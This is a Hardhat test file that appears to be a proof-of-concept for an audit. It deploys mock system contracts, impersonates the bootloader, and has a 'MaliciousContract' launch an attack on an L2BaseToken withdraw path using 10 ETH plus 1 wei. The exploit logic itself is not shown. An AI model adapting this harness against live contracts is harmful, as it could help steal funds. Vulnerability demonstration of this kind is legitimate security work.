const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("L2BaseToken Attack Test", function () {
    let l2BaseToken;
    let maliciousContract;
    let owner;
    let attacker;
    let systemContext;
    let l1Messenger;
    let accountCodeStorage;
    let nonceHolder;
    let bootloader;

    beforeEach(async function () {
        // Get signers
        [owner, attacker] = await ethers.getSigners();

        // Deploy system contracts
        const MockSystemContext = await ethers.getContractFactory("MockSystemContext");
        systemContext = await MockSystemContext.deploy();
        await systemContext.waitForDeployment();

        // Deploy L1 messenger at the correct system contract address
        const L1_MESSENGER_ADDRESS = "0x0000000000000000000000000000000000008008"; // SYSTEM_CONTRACTS_OFFSET + 0x08
        const MockL1Messenger = await ethers.getContractFactory("MockL1Messenger");
        l1Messenger = await MockL1Messenger.deploy();
        await l1Messenger.waitForDeployment();
        
        // Impersonate the L1 messenger address and set its code
        await hre.network.provider.send("hardhat_setCode", [
            L1_MESSENGER_ADDRESS,
            await hre.network.provider.send("eth_getCode", [await l1Messenger.getAddress()])
        ]);

        const MockAccountCodeStorage = await ethers.getContractFactory("MockAccountCodeStorage");
        accountCodeStorage = await MockAccountCodeStorage.deploy();
        await accountCodeStorage.waitForDeployment();

        const MockNonceHolder = await ethers.getContractFactory("MockNonceHolder");
        nonceHolder = await MockNonceHolder.deploy();
        await nonceHolder.waitForDeployment();

        // Deploy L2BaseToken
        const L2BaseToken = await ethers.getContractFactory("L2BaseToken");
        l2BaseToken = await L2BaseToken.deploy();
        await l2BaseToken.waitForDeployment();

        // Deploy MaliciousContract
        const MaliciousContract = await ethers.getContractFactory("MaliciousContract");
        maliciousContract = await MaliciousContract.deploy();
        await maliciousContract.waitForDeployment();

        // Set the target contract
        await maliciousContract.setTarget(await l2BaseToken.getAddress());

        // Impersonate the bootloader address
        const bootloaderAddress = "0x0000000000000000000000000000000000008001";
        await hre.network.provider.send("hardhat_impersonateAccount", [bootloaderAddress]);
        bootloader = await ethers.getImpersonatedSigner(bootloaderAddress);

        // Fund the bootloader with ETH
        await owner.sendTransaction({
            to: bootloaderAddress,
            value: ethers.parseEther("10") // Send 10 ETH
        });

        // Mint some tokens to the owner (as bootloader)
        await l2BaseToken.connect(bootloader).mint(owner.address, ethers.parseEther("1000"));

        // Transfer some ETH to the L2BaseToken contract
        await l2BaseToken.connect(bootloader).transferFromTo(
            owner.address,
            await l2BaseToken.getAddress(),
            ethers.parseEther("10")
        );

        // Fund the attacker with 1000 ETH
        await owner.sendTransaction({
            to: attacker.address,
            value: ethers.parseEther("1000.0")
        });
    });

    it("should demonstrate the attack", async function () {
        // Initial state
        const initialBalance = await l2BaseToken.balanceOf(owner.address);

        const attackerBalance = await l2BaseToken.balanceOf(attacker.address);
        console.log("Attacker token balance before withdraw:", ethers.formatEther(attackerBalance));

        const internalBalanceOfL2BaseTokenContract = await l2BaseToken.balanceOf(l2BaseToken.getAddress());
        console.log("L2BaseTokenContract internal balance before withdraw:", ethers.formatEther(internalBalanceOfL2BaseTokenContract));

        // Enable transaction tracing
        await hre.network.provider.send("hardhat_setLoggingEnabled", [true]);

        // Attacker initiates the attack
        const attackAmount = ethers.parseEther("10") + 1n;
        try {
/*             const tx = await l2BaseToken.connect(attacker).withdraw(attacker.address, {
                value: attackAmount
            }); */
            
            const tx = await maliciousContract.connect(attacker).initiateAttack({ value: attackAmount });
            console.log("Withdrawal transaction hash:", tx.hash);
            const receipt = await tx.wait();
            console.log("Transaction receipt:", receipt);
        } catch (error) {
            console.log("Transaction failed with error:", error);
            // Get the transaction trace
            const trace = await hre.network.provider.send("debug_traceTransaction", [error.transactionHash]);
            console.log("Transaction trace:", JSON.stringify(trace, null, 2));
        }

        const internalBalance2 = await l2BaseToken.balanceOf(l2BaseToken.getAddress());
        console.log("L2BaseToken internal balance after withdraw:", ethers.formatEther(internalBalance2));


        // Check final state
        const finalBalance = await l2BaseToken.balanceOf(owner.address);
        
        // Check if attack was executed
        const attackExecuted = await maliciousContract.checkAttackSuccess();
        expect(attackExecuted).to.be.true;


        // Verify system contract interactions
        const lastL1Message = await l1Messenger.getLastMessage();
        expect(lastL1Message).to.not.equal(ethers.ZeroHash);

        const accountCode = await accountCodeStorage.getCodeHash(attacker.address);
        expect(accountCode).to.not.equal(ethers.ZeroHash);

        const nonce = await nonceHolder.getMinNonce(attacker.address);
        expect(nonce).to.be.gt(0);
    });

    it("should fail when system contracts are not properly initialized", async function () {
        // Deploy L2BaseToken
        const L2BaseToken = await ethers.getContractFactory("L2BaseToken");
        const invalidL2BaseToken = await L2BaseToken.deploy();
        await invalidL2BaseToken.waitForDeployment();

        // Deploy MaliciousContract
        const MaliciousContract = await ethers.getContractFactory("MaliciousContract");
        const invalidMaliciousContract = await MaliciousContract.deploy();
        await invalidMaliciousContract.waitForDeployment();

        // Set the target contract
        await invalidMaliciousContract.setTarget(await invalidL2BaseToken.getAddress());

        // Attempt attack should fail
        const attackAmount = ethers.parseEther("1");
        await expect(
            invalidMaliciousContract.connect(attacker).initiateAttack({ value: attackAmount })
        ).to.be.revertedWith("System contracts not initialized");
    });
}); 